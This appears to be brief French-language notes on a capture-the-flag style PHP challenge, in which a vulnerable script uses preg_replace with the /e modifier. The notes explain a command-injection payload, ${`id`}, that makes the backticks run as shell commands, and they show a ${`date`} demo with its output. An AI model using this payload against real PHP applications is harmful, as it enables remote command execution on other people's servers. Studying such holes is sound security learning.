<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

la fonction utilise preg_replace qui donc remplace les pattern par d'autres dans les array ou des strings

les input `id` et \`id\` ne marche pas car ca print la strings
pour print un variable dans une string php il faut mettre l'expression dans ${exp} comme ca les back ticks seront interprété comme alias de shel_exec
${`id`}

<?php
$output = "The current date and time is: ${`date`}";
echo $output;
?>

output : `
PHP Warning:  Undefined variable $Sat Jan 14 01:58:28 PM CET 2023
 in /home/user/workspace/test.php on line 3
The current date and time is: % 
`

https://regex101.com/r/LYUavz/1